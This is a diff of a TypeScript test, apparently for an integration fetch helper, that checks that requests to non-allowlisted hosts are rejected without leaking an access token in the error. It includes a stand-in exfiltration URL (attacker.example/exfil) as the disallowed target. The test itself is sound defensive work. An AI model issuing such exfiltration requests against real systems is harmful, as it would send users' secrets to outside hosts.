@@ -3,7 +3,6 @@ import { http, HttpResponse } from 'msw'
 import {
 	type CapabilityArgs,
 	type CodemodeNamespace,
-	type ExecuteRequestInput,
 	IntegrationHostNotAllowedError,
 	createAuthenticatedFetch,
 } from './codemode-utils.ts'
@@ -83,20 +82,15 @@ test('createAuthenticatedFetch enforces integration host allowlists and fails cl
 
 	const fetchCallsAfterSetup = fetchCalls.length
 
-	await expect(
-		authenticatedFetch('https://attacker.example/exfil'),
-	).rejects.toThrow(IntegrationHostNotAllowedError)
-	expect(fetchCalls.length).toBe(fetchCallsAfterSetup)
-
-	let disallowedError: Error | null = null
 	try {
 		await authenticatedFetch('https://attacker.example/exfil')
+		expect.unreachable('expected disallowed host rejection')
 	} catch (error) {
-		disallowedError = error as Error
+		expect(error).toBeInstanceOf(IntegrationHostNotAllowedError)
+		expect(String(error)).not.toContain(fakeAccessToken)
+		expect(JSON.stringify(error)).not.toContain(fakeAccessToken)
 	}
-	expect(disallowedError).toBeInstanceOf(IntegrationHostNotAllowedError)
-	expect(disallowedError!.message).not.toContain(fakeAccessToken)
-	expect(JSON.stringify(disallowedError)).not.toContain(fakeAccessToken)
+	expect(fetchCalls.length).toBe(fetchCallsAfterSetup)
 
 	const apiResponse = await authenticatedFetch('https://api.spotify.com/v1/me')
 	expect(apiResponse.status).toBe(200)
